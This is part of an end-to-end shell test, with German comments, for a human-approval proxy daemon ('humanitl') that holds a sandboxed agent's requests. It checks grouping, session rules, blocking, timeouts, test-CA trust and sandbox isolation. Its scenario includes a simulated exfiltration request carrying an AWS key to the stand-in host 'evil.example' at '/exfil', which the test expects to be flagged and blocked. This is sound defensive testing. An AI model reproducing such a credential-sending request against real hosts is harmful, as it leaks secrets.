# konfiguriert wäre — eine Zusicherung ohne ihre Voraussetzung.
#
# Dass der Daemon die Zuordnung auch benutzt, zeigt sich später von selbst: Im
# Namensraum gibt es keinen Namensdienst, und ohne sie endete jede freigegebene
# Anfrage als `upstream_dns` statt mit dem Inhalt des Ziels.
overrides=$(humanitl --json config get resolver.overrides |
    jq -r '.value | to_entries | map("\(.key)=\(.value)") | join(" ")')
e2e_expect "the resolver override points all three hosts at the target" \
    "api.github.com=$E2E_FAKE_ADDR evil.example=$E2E_FAKE_ADDR registry.npmjs.org=$E2E_FAKE_ADDR" \
    "$overrides"

configured_ca=$(humanitl --json config get resolver.test_ca | jq -r '.value')
e2e_expect "the configuration names the test CA of this run" \
    "$M2_CA_DIR/test-ca.crt" "$configured_ca"

if [ -s "$configured_ca" ] &&
    head -n 1 "$configured_ca" | grep -q '^-----BEGIN CERTIFICATE-----$'; then
    e2e_check "and that file really is a certificate" ok
else
    e2e_check "and that file really is a certificate" no \
        "$configured_ca is missing, empty or not PEM"
fi

# Der Stolperdraht zu Schritt 7, umgedreht (HUM-087). Bis das Flag existierte,
# sicherte er zu, dass es der Daemon **nicht** kennt, und starb, sobald das
# nicht mehr stimmte. Jetzt sichert er die andere Hälfte derselben Aussage zu:
# dass dieser Lauf das Flag wirklich benutzt. Ohne ihn stünden die
# Behauptungen von Schritt 7 auf einem Ergebnis, das auch aus einem ganz
# anderen Grund eintreten könnte — etwa weil jemand die Wurzel doch ohne Flag
# gelten ließe. Geprüft wird deshalb wieder die Fläche und nicht nur ihre
# Wirkung: die Kommandozeile des Binaries, der Startbefehl dieses Laufs, und
# die Zeile, mit der der Daemon selbst sagt, was er geladen hat.
if "$E2E_DAEMON" --help 2>&1 | grep -q -- '--allow-test-ca'; then
    e2e_check "humanitld offers --allow-test-ca, the switch step 7 rests on" ok
else
    e2e_check "humanitld offers --allow-test-ca, the switch step 7 rests on" no \
        "humanitld no longer knows --allow-test-ca. Either it was removed, then step 7 has to go back to expecting 502 upstream_tls and the URLs in script.json back to http:// (see CONVENTIONS.md 4.22), or it was renamed, then this run has to start the daemon with the new name."
fi

# Und dass dieser Lauf es auch übergeben hat. `DAEMON_ARGV` kommt aus
# `start_daemon` und ist das, was wirklich an `humanitld` ging; eine Prüfung
# auf die Konstante im Skript sagte nur, was jemand hinschreiben wollte.
e2e_expect_match "and this run started the daemon with it" \
    '(^| )--allow-test-ca( |$)' "$DAEMON_ARGV"

# Und der Daemon sagt es auch selbst, statt dass der Lauf es aus einem
# Ausbleiben schließt: eine Zeile mit der Zahl der geladenen Wurzeln und dem
# Pfad, aus dem sie kommen, auf der Stufe `WARN` (docs/SECURITY.md 5).
daemon_trust_line=$(grep -F -- '--allow-test-ca' "$DAEMON_LOG" | head -n 1)
e2e_expect_match "and the daemon says on its own that it loaded the root" \
    '"roots":1' "$daemon_trust_line"
e2e_expect_match "and names the file it loaded it from" \
    "\"path\":\"$M2_CA_DIR/test-ca.crt\"" "$daemon_trust_line"
e2e_expect_match "and says it at the level a widened trust deserves" \
    '"level":"WARN"' "$daemon_trust_line"

# Und dass er nichts zu bemängeln hatte: `CONFIG_011` steht im Protokoll, wenn
# Flag und Schlüssel nicht zusammenpassen, `CONFIG_010` wenn die Datei
# unbrauchbar ist. Beides hieße, dass dieser Lauf gar keine fremde Wurzel
# benutzt, und Schritt 7 belegte dann etwas anderes als er sagt.
if grep -q -E 'CONFIG_01[01]' "$DAEMON_LOG"; then
    e2e_check "and the daemon had nothing to complain about the pair" no \
        "$(grep -E -m 1 'CONFIG_01[01]' "$DAEMON_LOG")"
fi
e2e_check "and the daemon had nothing to complain about the pair" ok

# Und dass die Sandbox mitbringt, was der Agent gleich braucht. Beides liegt
# unter /usr, das jedes Profil nur lesbar einhängt; fehlt es, soll die Meldung
# das sagen und nicht eine Reihe stiller Fehlschläge sein.
tools=$(sandbox_run /usr/bin/python3 -c \
    'import os; print("curl", os.access("/usr/bin/curl", os.X_OK))' 2> /dev/null || true)
e2e_expect_match "the sandbox has the client the agent speaks through" \
    '^curl True$' "$tools"

# --- Der Agent ---------------------------------------------------------------

if [ "$M2_SCREEN" = 1 ]; then
    e2e_step "the screen connects before anything is held"
    m2_start_screen
fi

e2e_step "the agent starts and its requests pile up"

cp "$E2E_ROOT/tests/e2e/fake-agent/fake_agent.py" "$E2E_WORKDIR/work/fake_agent.py"
cp "$M2_DIR/script.json" "$E2E_WORKDIR/work/script.json"

sandbox_run /usr/bin/python3 /work/fake_agent.py /work/script.json \
    > "$M2_AGENT_LOG" 2> "$M2_AGENT_ERR" &
M2_AGENT_PID=$!

# --- 1. Gruppierung ----------------------------------------------------------

e2e_step "1. the daemon groups the requests by registrable domain"

m2_expect_count "twelve requests to the package registry are held" \
    30 12 "state:held apex:npmjs.org"

# `apex:` liest die Spalte, die der Domain-Katalog beim Eintreffen gefüllt hat,
# `host:` den Namen aus der Anfrage. Beide Zahlen nebeneinander sind die
# Aussage: Der Daemon hat die zwölf Hosts einer Domäne zugeordnet, und nicht
# nur zwölf gleiche Namen gezählt.
npm_by_host=$(m2_count "state:held host:registry.npmjs.org")
e2e_expect "and the same twelve when asked by host" 12 "$npm_by_host"

# --- Die Ids des Stapels, bevor irgendwer sie entscheidet --------------------
#
# Sie sind später die einzige Möglichkeit, den Teil der Freigaben, den ein
# Mensch ausgesprochen hat, vom Teil zu trennen, den die Regel übernommen hat.
# Der Filter kann das nicht — er kennt keinen Term für „ohne Regel". Mit
# Oberfläche werden sie hier festgehalten und der Bildschirm bekommt danach
# sein Zeichen; ohne sie tut es Abschnitt 2 unten an derselben Stelle.
if [ "$M2_SCREEN" = 1 ]; then
    m2_ids "state:held apex:npmjs.org" > "$M2_BATCH_IDS"
    : > "$M2_UI_GO"
    e2e_say "the screen may decide now; $(wc -l < "$M2_BATCH_IDS" | tr -d ' ') ids of the batch are written down"
fi

if [ "$M2_SCREEN" = 0 ]; then

# --- 2. Stapel-Freigabe mit Sitzungsregel ------------------------------------
#
# Die Freigabe kommt vor allen weiteren Behauptungen über die anderen beiden
# Hosts: Die erste Anfrage der Gruppe wartet seit dem Start, und ihre Frist
# läuft. Ein Skript, das erst noch auf Anfragen wartet, die später eintreffen,
# ließe sie unterwegs verfallen und prüfte danach etwas anderes als gemeint.

e2e_step "2. a human releases the whole group and remembers it for this session"

# Die Regel entsteht in der Entscheidung, nicht daneben. `DecideRequest.remember`
# legt beides in einem Aufruf an, und seit HUM-095 erreicht `humanitl flows
# decide --remember <PATTERN>` das auch von der Kommandozeile aus. Die Regel
# hängt damit am ersten Flow des Stapels und trägt seine Id als Herkunft; der
# Dienst nimmt sie zurück, wenn dieser Flow nicht mehr entschieden werden kann.
# Mehrere Ids je Aufruf gibt es weiter nicht, der Stapel bleibt die Schleife,
# und nur ihr erster Durchlauf trägt das Flag — zwölf Aufrufe mit `--remember`
# legten zwölf Regeln an. Die Wirkung auf die zwölf wartenden Anfragen ist
# dieselbe wie vorher: Entschieden wird beim Eintreffen, sie gehen also über die
# Entscheidung, alles Spätere über die Regel.

# Die Ids des Stapels werden festgehalten, bevor sie entschieden werden: Sie
# sind später die einzige Möglichkeit, den Teil der Freigaben, den ein Mensch
# ausgesprochen hat, vom Teil zu trennen, den die Regel übernommen hat. Der
# Filter kann das nicht — er kennt keinen Term für „ohne Regel".
m2_ids "state:held apex:npmjs.org" > "$M2_BATCH_IDS"
M2_RULE_ID=""
M2_RULE_FROM=""
while read -r flow; do
    [ -n "$flow" ] || continue
    if [ -z "$M2_RULE_ID" ]; then
        m2_decide_json=$(flow_decide "$flow" allow "" \
            --remember '**.npmjs.org' \
            --remember-note 'e2e: the whole npm group, for this session') ||
            e2e_die "the daemon refused the allow that carries the session rule"
        M2_RULE_ID=$(printf '%s' "$m2_decide_json" | jq -r '.created_rule_id // ""')
        [ -n "$M2_RULE_ID" ] ||
            e2e_die "the decision went through without creating the session rule"
        M2_RULE_FROM="$flow"
        e2e_say "session rule $M2_RULE_ID, created from $flow"
    else
        flow_decide "$flow" allow || e2e_say "the daemon refused the allow for $flow"
    fi
done < "$M2_BATCH_IDS"

rules_json=$(humanitl --json rules list)
e2e_expect "the rule store holds exactly one session rule" 1 \
    "$(printf '%s' "$rules_json" | jq '[.rules[] | select(.expires.kind == "session")] | length')"

rule_row=$(printf '%s' "$rules_json" |
    jq -c --arg id "$M2_RULE_ID" '.rules[] | select(.rule_id == $id)')
e2e_expect "it allows the whole registrable domain" '**.npmjs.org' \
    "$(printf '%s' "$rule_row" | jq -r '.host')"
e2e_expect "with the action a release means" allow \
    "$(printf '%s' "$rule_row" | jq -r '.action')"
e2e_expect "and it is temporary, not permanent" session \
    "$(printf '%s' "$rule_row" | jq -r '.expires.kind')"
# Die Zusage aus ADR-0007: Eine Regel kann nennen, woraus sie entstand. Ohne
# sie wäre diese Sitzungsregel von einer handgeschriebenen nicht zu
# unterscheiden, und das Abzeichen „from #n" des Regel-Bildschirms bliebe leer.
e2e_expect "and it names the request a human released first" "$M2_RULE_FROM" \
    "$(printf '%s' "$rule_row" | jq -r '.created_from_flow_id')"

# Gefragt wird der Daemon, nicht die Schleife: Ein Rückgabewert von `humanitl`
# sagt, dass der Aufruf durchging, nicht, dass der Fluss entschieden ist.
m2_expect_count "no request to the registry is waiting any more" \
    20 0 "state:held apex:npmjs.org"
m2_expect_count "and the daemon has all twelve of them decided allow" \
    20 12 "apex:npmjs.org decision:allow"

# --- 3. Die anderen beiden Gruppen und ihre Funde ----------------------------

e2e_step "3. the other two hosts are groups of their own, and two of them carry a finding"

m2_expect_count "the two requests to the code host are a group of their own" \
    30 2 "state:held apex:github.com"
# Auch der dritte Host bekommt eine Domäne, obwohl `example` keine
# eingetragene Top-Level-Domain ist: Die Public Suffix List hat dafür ihre
# Vorgaberegel, und der Katalog trägt `evil.example` als Apex ein. Gefragt wird
# hier deshalb wie bei den anderen beiden über `apex:`.
m2_expect_count "and the third host is a group of one" \
    30 1 "state:held apex:evil.example"

m2_expect_count "exactly two held requests carry a finding" \
    10 2 "state:held findings:>0"
e2e_expect "the POST with the mail address carries one" 1 \
    "$(m2_field 'state:held path:/graphql' finding_count)"
e2e_expect "and the request with the AWS key carries one" 1 \
    "$(m2_field 'state:held path:/exfil' finding_count)"

# --- 4. Block und Freigabe ---------------------------------------------------

e2e_step "4. one request is blocked with a note, one is allowed, one is left alone"

exfil_flow=$(m2_field 'state:held path:/exfil' flow_id)
[ -n "$exfil_flow" ] ||
    e2e_die "the request with the AWS key is gone before anyone decided"
flow_decide "$exfil_flow" block "not in this run" ||
    e2e_die "the daemon refused the block"

graphql_flow=$(m2_field 'state:held path:/graphql' flow_id)
[ -n "$graphql_flow" ] ||
    e2e_die "the POST with the mail address is gone before anyone decided"
flow_decide "$graphql_flow" allow ||
    e2e_die "the daemon refused the allow"

# Die dritte, `/repos/x/y`, bleibt absichtlich liegen: Sie ist die Anfrage, die
# in die Zeitüberschreitung laufen soll.
e2e_say "leaving /repos/x/y undecided; its deadline is ${M2_HOLD_TIMEOUT}s"

else

# --- 2 bis 4 über den Bildschirm ---------------------------------------------
#
# Der Treiber läuft seit vor dem Agenten und hat sein Zeichen bekommen. Was er
# tut, prüft er selbst; hier wird nur abgewartet, was die Abschnitte 5 bis 9
# als Grundlage brauchen: dass der Stapel durch ist und welche Regel dabei
# entstanden ist. Die Id kommt aus dem Daemon und nicht aus dem Protokoll des
# Treibers — gefragt wird, was gilt, nicht was jemand gemeldet hat.

e2e_step "2. to 4. the screen decides, and the run waits for what it did"

m2_expect_count "no request to the registry is waiting any more" \
    30 0 "state:held apex:npmjs.org"
m2_expect_count "and the daemon has all twelve of them decided allow" \
    20 12 "apex:npmjs.org decision:allow"

m2_rules_left=100
while [ "$m2_rules_left" -gt 0 ]; do
    M2_RULE_ID=$(humanitl --json rules list 2> /dev/null |
        jq -r '[.rules[] | select(.expires.kind == "session")] | .[0].rule_id // ""' 2> /dev/null || true)
    [ -z "$M2_RULE_ID" ] || break
    sleep 0.2
    m2_rules_left=$((m2_rules_left - 1))
done
[ -n "$M2_RULE_ID" ] ||
    e2e_die "the screen released the group but no session rule reached the daemon; its log is in $M2_UI_LOG"
e2e_say "session rule $M2_RULE_ID, created on the screen"

rules_json=$(humanitl --json rules list)
e2e_expect "the rule store holds exactly one session rule" 1 \
    "$(printf '%s' "$rules_json" | jq '[.rules[] | select(.expires.kind == "session")] | length')"
rule_row=$(printf '%s' "$rules_json" |
    jq -c --arg id "$M2_RULE_ID" '.rules[] | select(.rule_id == $id)')
e2e_expect "it allows the whole registrable domain" '**.npmjs.org' \
    "$(printf '%s' "$rule_row" | jq -r '.host')"
e2e_expect "with the action a release means" allow \
    "$(printf '%s' "$rule_row" | jq -r '.action')"
e2e_expect "and it is temporary, not permanent" session \
    "$(printf '%s' "$rule_row" | jq -r '.expires.kind')"
# Die Herkunft: Die Oberfläche legt die Regel in der Entscheidung an, und seit
# HUM-095 tut die Kommandozeile im Zweig darüber dasselbe. Das Abzeichen `from`
# am Regel-Bildschirm zeichnet genau dieses Feld.
e2e_expect_match "and it names the request it was made from" \
    '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$' \
    "$(printf '%s' "$rule_row" | jq -r '.created_from_flow_id // ""')"

m2_expect_count "the request with the AWS key was blocked" \
    30 1 "path:/exfil decision:block"
m2_expect_count "and the POST with the mail address was allowed" \
    30 1 "path:/graphql decision:allow"

fi

# --- Warten, bis der Agent fertig ist ----------------------------------------

e2e_step "the agent runs to its end"

wait "$M2_AGENT_PID" || e2e_say "the agent exited non-zero; its log is in the artefacts"
M2_AGENT_PID=""
lines=$(wc -l < "$M2_AGENT_LOG" | tr -d ' ')
e2e_expect "the agent reports one line per request" 17 "$lines"

# Die drei Garantien, aus der Sandbox, die den Verkehr dieses Laufs getragen
# hat. `humanitl sandbox run -v` schreibt sie beim Start als Zeilen
# `check <name> pass|FAIL: <evidence>` nach stderr, und `sandbox run` beendet
# die Sandbox mit Exit 3, sobald eine rot ist. Beendet, nicht verhindert: Der
# Agent startet vor der Prüfung (docs/THREAT-MODEL.md K-15). Genau deshalb
# werden die Zeilen hier gelesen und nicht der Exit-Code allein geglaubt: M2
# ist der einzige Lauf, in dem die Sandbox echten Verkehr trägt, und ein
# Bericht, in den niemand sieht, ist kein Beleg.
isolation=$(cat "$M2_AGENT_ERR")
e2e_expect_match "the sandbox that carried this run had no interface but lo" \
    'check no_network_interface pass' "$isolation"
e2e_expect_match "and exactly one socket, and it was the proxy" \
    'check single_socket pass' "$isolation"
e2e_expect_match "and seccomp was active in the agent process" \
    'check seccomp_active pass' "$isolation"

# --- 5. Was der Agent gesehen hat --------------------------------------------

e2e_step "5. what the agent got back"

# Zwölf aus dem Stapel, die spätere Anfrage, die die Regel erlaubt hat, und die
# TLS-Probe, die seit HUM-087 durchkommt: vierzehn.
npm_ok=$(jq -r 'select(.url | startswith("https://registry.npmjs.org/")) | .status' \
    "$M2_AGENT_LOG" | grep -c '^200$' || true)
e2e_expect "the released requests answer with the content of the target" 14 "$npm_ok"

e2e_expect "the blocked request ends as 403" 403 \
    "$(m2_agent_field "$M2_URL_BLOCKED" status)"
blocked_body=$(m2_agent_field "$M2_URL_BLOCKED" body_head)
e2e_expect_match "and names the human as the reason" '^reason: user$' "$blocked_body"
e2e_expect_match "and carries the note of the human" '^note: not in this run$' "$blocked_body"
# Dieselbe Notiz im Header, wie der Agent ihn bekam (HUM-072). `fake_agent.py`
# hält die Kopfzeilen der letzten Antwort fest; ein Agent, der nur Header liest,
# erfährt den Grund sonst nie.
blocked_note_header=$(jq -r --arg url "$M2_URL_BLOCKED" \
    'select(.url == $url) | .headers["x-humanitl-note"] // ""' "$M2_AGENT_LOG" 2> /dev/null || true)
e2e_expect "and the same note in the header X-Humanitl-Note" "not in this run" "$blocked_note_header"

e2e_expect "the allowed POST answers with 200" 200 \
    "$(m2_agent_field "$M2_URL_ALLOWED" status)"

e2e_expect "the request nobody decided ends as 504" 504 \
    "$(m2_agent_field "$M2_URL_TIMEOUT" status)"
timeout_body=$(m2_agent_field "$M2_URL_TIMEOUT" body_head)
e2e_expect_match "and names the deadline" '^reason: timeout$' "$timeout_body"

# --- 6. Was die Regel danach entscheidet -------------------------------------

e2e_step "6. the session rule decides what comes after it"

e2e_expect "the later request to the registry was allowed" allow \
    "$(m2_field 'path:/chalk' decision)"
e2e_expect "by the session rule, not by a human" "$M2_RULE_ID" \
    "$(m2_field 'path:/chalk' rule_id)"
e2e_expect "and it never waited for one" recorded \
    "$(m2_field 'path:/chalk' state)"

# --- 7. Die fremde Wurzel ----------------------------------------------------

e2e_step "7. the test CA in the configuration is trusted, because the flag says so"

# `resolver.test_ca` zeigt auf die Wurzel, mit der der Fake-Upstream sein
# TLS-Zertifikat unterschrieben hat, und der Daemon dieses Laufs ist mit
# `--allow-test-ca` gestartet. Beide Hälften zusammen machen die Wurzel gültig;
# eine allein bewirkt nichts (`docs/SECURITY.md` 5, HUM-087). Belegt wird das
# an der Anfrage, die die Sitzungsregel ohne jede Rückfrage erlaubt hat: Sie
# kommt durch den Handschlag zum Ziel und bringt dessen Antwort mit.
e2e_expect "the TLS request goes through the proxy to the target" 200 \
    "$(m2_agent_field "$M2_URL_TLS" status)"

# Der Status allein sagt zu wenig: Eine `200` könnte auch vom Proxy selbst
# kommen, vom Meta-Endpunkt oder von irgendeinem anderen Gegenüber. Geprüft
# wird deshalb der Rumpf, den der Agent gesehen hat — es ist die Antwort des
# Fake-Upstreams, mit dem Pfad und dem Host, nach denen gefragt wurde.
tls_body=$(m2_agent_field "$M2_URL_TLS" body_head)
e2e_expect "and the body is the answer of the target, not of anyone else" \
    /tls-probe "$(printf '%s' "$tls_body" | jq -r '.path // ""' 2> /dev/null || true)"
e2e_expect "and the target saw the host the agent asked for" \
    registry.npmjs.org \
    "$(printf '%s' "$tls_body" | jq -r '.host // ""' 2> /dev/null || true)"

e2e_expect "the flow carries no upstream error any more" "" \
    "$(m2_field 'path:/tls-probe' error)"
e2e_expect "and it was allowed without anybody being asked" allow \
    "$(m2_field 'path:/tls-probe' decision)"

# Und der Proxy stand dabei wirklich in der Mitte: Der Agent hat das Blatt der
# Humanitl-CA gesehen (sonst hätte `curl` mit seinem `CURL_CA_BUNDLE` den
# Handschlag abgebrochen), der Daemon das Blatt des Ziels. Zwei getrennte
# TLS-Sitzungen, und der Fund im entschlüsselten Rumpf der POST-Anfrage weiter
# oben belegt, dass dazwischen wirklich Klartext lag. Die Zeile der
# Flow-Liste trägt kein Schema-Feld; was sie trägt, ist der Port, und der ist
# der des TLS-Listeners.
e2e_expect "and the flow went to the TLS port of the target" "$M2_HTTPS_PORT" \
    "$(m2_row 'path:/tls-probe' | jq -r '.authority.port // 0')"

# Die Gegenprobe, ohne die der Schritt weniger sagt: Ein Klient im selben
# Namensraum, mit derselben Wurzel und ohne Proxy, schafft den Handschlag — und
# ohne die Wurzel scheitert er. Sie belegt, dass das Material gültig ist und
# dass eine Prüfung dagegen überhaupt etwas entscheidet; ein Ziel, dem jeder
# vertraute, machte Schritt 7 wertlos. Die Richtung „ohne Flag gilt die Wurzel
# nicht" misst der Rust-Test `a_test_ca_is_only_trusted_with_the_flag`, nicht
# eine zweite Daemon-Instanz in diesem Lauf.
#
# `--noproxy '*'` und `--resolve`: Der Aufruf geht direkt zum Ziel, nicht über
# den Proxy, und mit dem Namen, für den das Blatt gilt. Der eigene Pfad
# `/tls-control` trennt diese Anfrage im Protokoll des Ziels von der, die durch
# den Proxy ging; die Gegenprobe in Schritt 9 zählt beide getrennt.
control=$(curl -sS --max-time 5 --noproxy '*' \
    --cacert "$M2_CA_DIR/test-ca.crt" \
    --resolve "registry.npmjs.org:$M2_HTTPS_PORT:$E2E_FAKE_ADDR" \
    "https://registry.npmjs.org$M2_PATH_TLS_CONTROL" 2> /dev/null || true)
e2e_expect "a client that does trust the test CA completes the handshake" \
    "$M2_PATH_TLS_CONTROL" \
    "$(printf '%s' "$control" | jq -r '.path // ""' 2> /dev/null || true)"

without_root=$(curl -sS --max-time 5 --noproxy '*' \
    --resolve "registry.npmjs.org:$M2_HTTPS_PORT:$E2E_FAKE_ADDR" \
    "https://registry.npmjs.org$M2_PATH_TLS_CONTROL" 2>&1 || true)
e2e_expect_match "and the same client without it does not" \
    'certificate|SSL|TLS' "$without_root"

# --- 8. Die Historie ---------------------------------------------------------

e2e_step "8. the history holds the set the export is built from"

m2_expect_count "the history holds every request of the run" 20 17 ""
m2_expect_count "fifteen of them were allowed" 10 15 "decision:allow"
m2_expect_count "one was blocked by a human" 10 1 "decision:block"
m2_expect_count "and one ran into the deadline" 10 1 "decision:timed_out"
m2_expect_count "the block names the human as its reason" 10 1 "reason:user"
m2_expect_count "and the deadline names itself" 10 1 "reason:timeout"
m2_expect_count "two requests carry a finding" 10 2 "findings:>0"

e2e_expect "fourteen requests to the registry were allowed" 14 \
    "$(m2_count 'apex:npmjs.org decision:allow')"
e2e_expect "two of them by the session rule" 2 "$(m2_count "rule:$M2_RULE_ID")"

# Und zwölf durch einen Menschen. Gefragt wird nach den Ids, die vor der
# Freigabe festgehalten wurden, und nach dem, was der Daemon heute über sie
# sagt: Entscheidung `allow`, keine Regel. Die Differenz zweier Zahlen des
# Skripts wäre eine Rechnung, keine Auskunft.
by_human=$(m2_flow_page "" | jq --arg ids "$(cat "$M2_BATCH_IDS")" '
    ($ids | split("\n") | map(select(length > 0))) as $batch
    | [.flows[]
       | select(.flow_id as $id | $batch | index($id) != null)
       | select(.decision == "allow" and .rule_id == "")]
    | length')
e2e_expect "and twelve by a human, each without a rule behind it" 12 "$by_human"

# --- 9. Was das Ziel selbst gesehen hat --------------------------------------

e2e_step "9. the counter-check at the target"

# Die Gegenprobe zu allem, am selben Ziel. Bedient hat es siebzehn Anfragen:
# die Erreichbarkeits-Probe, die fünfzehn, die ein Mensch oder seine Regel
# erlaubt hat, und die positive TLS-Kontrolle aus Schritt 7 — und keine einzige
# darüber hinaus. Was ein Mensch verboten hat, steht null Mal in seinem
# Protokoll, und was niemand entschieden hat, ebenso wenig.
#
# Sechzehn waren es, solange die TLS-Anfrage am Handschlag scheiterte; mit
# `--allow-test-ca` kommt sie durch, und das ist genau die Anfrage, die dieses
# Issue zurückgeholt hat (HUM-087).
served=$(grep -c ' 200 [0-9]*$' "$M2_UPSTREAM_LOG" || true)
e2e_expect "the target served the two probes and the fifteen allowed requests" \
    17 "$served"
e2e_expect "and never the request a human forbade" 0 "$(m2_upstream_hits '/exfil')"
e2e_expect "and never the one nobody decided" 0 "$(m2_upstream_hits '/repos/x/y')"

# Und der ganze Verkehr des Agenten lief über die TLS-Terminierung. Gezählt
# wird nach dem Schema, unter dem das Ziel die Anfrage angenommen hat: Alles
# außer der Erreichbarkeits-Probe kam über TLS an. Das ist die Abdeckung, die
# vor HUM-087 fehlte — sechzehn der siebzehn Anfragen waren Klartext, und die
# einzige verschlüsselte existierte, um zu scheitern.
tls_served=$(awk '$2 == "https" { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")
plain_served=$(awk '$2 == "http" { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")
e2e_expect "the target served sixteen requests over TLS" 16 "$tls_served"
e2e_expect "and exactly one in the clear, the reachability probe" 1 "$plain_served"
e2e_expect "and that one really was the probe" /reachable \
    "$(awk '$2 == "http" { print $5 }' "$M2_UPSTREAM_LOG")"

# Und die Anfrage, die durch den Proxy ging, kam genau einmal an. Die Kontrolle
# aus Schritt 7 zählt getrennt, weil sie einen eigenen Pfad hat: Ohne diese
# Trennung wäre nicht zu sehen, welche der beiden das Ziel wirklich erreicht
# hat.
e2e_expect "the request through the proxy reached the target exactly once" 1 \
    "$(awk '$2 == "https" && $5 == "/tls-probe" { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")"
e2e_expect "and so did the control that went past it" 1 \
    "$(awk -v path="$M2_PATH_TLS_CONTROL" \
        '$2 == "https" && $5 == path { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")"

# --- 10. Die Oberfläche ------------------------------------------------------

e2e_step "10. the screen shows the same run"

if [ "$M2_SCREEN" = 0 ]; then
    e2e_say "M2_UI=0: the screen half is switched off for this run"
    e2e_say "         Nothing about the screen and nothing about the HAR export was verified."
else
    # Der Treiber läuft seit dem Anfang. Jetzt, wo alles entschieden ist und
    # die Historie steht, ist auch sein Export fällig; hier wird sein Ende
    # abgewartet und danach die Datei gelesen, die er geschrieben hat.
    if ! m2_wait_screen; then
        e2e_say "--- the last lines of the screen driver ---"
        tail -n 40 "$M2_UI_LOG" >&2 || true
        e2e_die "the integration test of the screen failed or ran past ${M2_UI_WAIT_SECS}s; its whole log is in $M2_UI_LOG"
    fi

    if [ -s "$M2_HAR" ]; then
        e2e_check "the screen wrote the HAR export" ok
    else
        e2e_check "the screen wrote the HAR export" no "$M2_HAR is missing or empty"
    fi
    e2e_expect "the export holds every request of the run" 17 \
        "$(jq -r '.log.entries | length' "$M2_HAR")"

    # Und der Bildschirm hat den Dienst benannt, nicht den Host. Die Zeile steht
    # in einer Datei, die der Bildschirm-Treiber geschrieben hat, damit die
    # Prüfung des Namens im zählenden Skript liegt und nicht nur in Dart: Ein
    # Dart-Test, der als einziger davon weiß, zählt in der Bilanz dieses Laufs
    # nicht mit (HUM-094).
    e2e_check "the screen names the service, not the host" \
        "$(grep -q 'npm registry' "$M2_GROUP_SUMMARY" 2> /dev/null && echo ok)" \
        "$M2_GROUP_SUMMARY does not name the service; the head of the group fell back to a host"
    e2e_check "and says what the group looks like" \
        "$(grep -q 'Looks like: npm install' "$M2_GROUP_SUMMARY" 2> /dev/null && echo ok)" \
        "$M2_GROUP_SUMMARY carries no catalog line"

    # Und die Entscheidungen stehen darin, mit den Namen, unter denen der
    # Daemon sie führt. Ein Export, der `timedOut` statt `timed_out` schriebe,
    # ließe sich neben keine Filterzeile und neben keine CLI-Ausgabe legen
    # (`backlog/CONVENTIONS.md` 4.22).
    har_decisions() {
        jq -r --arg value "$1" \
            '[.log.entries[] | select(._humanitl.decision == $value)] | length' \
            "$M2_HAR"
    }
    e2e_expect "fifteen entries say allow" 15 "$(har_decisions allow)"
    e2e_expect "one says block" 1 "$(har_decisions block)"
    e2e_expect "and one says timed_out, the name the daemon uses" 1 \
        "$(har_decisions timed_out)"
    e2e_expect "two of the allowed ones carry the id of the session rule" 2 \
        "$(jq -r --arg id "$M2_RULE_ID" \
            '[.log.entries[] | select(._humanitl.rule_id == $id)] | length' "$M2_HAR")"
    e2e_expect "the blocked one names the human as its reason" user \
        "$(jq -r '[.log.entries[] | select(._humanitl.decision == "block")][0]._humanitl.block_reason // ""' "$M2_HAR")"
fi

# --- Der geordnete Abschied --------------------------------------------------

e2e_step "the daemon leaves nothing behind"

# Erst der Nachweis, dass es die drei überhaupt gibt. Ohne ihn bestünden die
# drei Zusicherungen darunter auch dann, wenn der Daemon sie nie angelegt
# hätte — dieselbe Klasse von Prüfung, die aus zwei Gründen halten kann.
if [ -S "$DAEMON_SOCK" ] && [ -f "$DAEMON_TOKEN" ] && [ -S "$DAEMON_PROXY_SOCK" ]; then
    e2e_check "socket, token and proxy socket are there while the daemon runs" ok
else
    e2e_check "socket, token and proxy socket are there while the daemon runs" no \
        "socket=$([ -S "$DAEMON_SOCK" ] && echo yes || echo no) token=$([ -f "$DAEMON_TOKEN" ] && echo yes || echo no) proxy=$([ -S "$DAEMON_PROXY_SOCK" ] && echo yes || echo no)"
fi

stop_daemon
[ ! -e "$DAEMON_SOCK" ] ||
    e2e_check "SIGTERM removes the daemon socket" no "$DAEMON_SOCK is still there"
e2e_check "SIGTERM removes the daemon socket" ok
[ ! -e "$DAEMON_TOKEN" ] ||
    e2e_check "SIGTERM removes the token" no "$DAEMON_TOKEN is still there"
e2e_check "SIGTERM removes the token" ok
[ ! -e "$DAEMON_PROXY_SOCK" ] ||
    e2e_check "SIGTERM ends the proxy session" no "$DAEMON_PROXY_SOCK is still there"
e2e_check "SIGTERM ends the proxy session" ok

# --- Die Selbstprüfung -------------------------------------------------------

e2e_step "the run checks itself"

# Ein Lauf, der grün ist, weil ein Zweig übersprungen wurde, wäre schlimmer als
# gar keiner. Der Zähler steht in `lib.sh` und wächst mit jeder geprüften
# Behauptung, gleich ob sie hielt. Die Erwartung hängt am Treiber: Mit
# Oberfläche entfallen die Abschnitte 2 bis 4 und Schritt 10 kommt dazu.
if [ "$M2_SCREEN" = 1 ]; then
    M2_EXPECTED_ASSERTIONS="$M2_EXPECTED_ASSERTIONS_SCREEN"
    M2_EXPECTED_NAME=M2_EXPECTED_ASSERTIONS_SCREEN
else
    M2_EXPECTED_ASSERTIONS="$M2_EXPECTED_ASSERTIONS_CLI"
    M2_EXPECTED_NAME=M2_EXPECTED_ASSERTIONS_CLI
fi
if [ "$E2E_ASSERTIONS" -lt "$M2_EXPECTED_ASSERTIONS" ]; then
    e2e_die "only $E2E_ASSERTIONS of $M2_EXPECTED_ASSERTIONS assertions ran; a branch was skipped"
fi
if [ "$E2E_ASSERTIONS" -gt "$M2_EXPECTED_ASSERTIONS" ]; then
    e2e_say "note: $E2E_ASSERTIONS assertions ran, $M2_EXPECTED_ASSERTIONS were expected;"
    e2e_say "      raise $M2_EXPECTED_NAME in this script so the number keeps its meaning"
fi
e2e_say "$E2E_ASSERTIONS assertions checked"

echo
echo "M2 demo: OK"
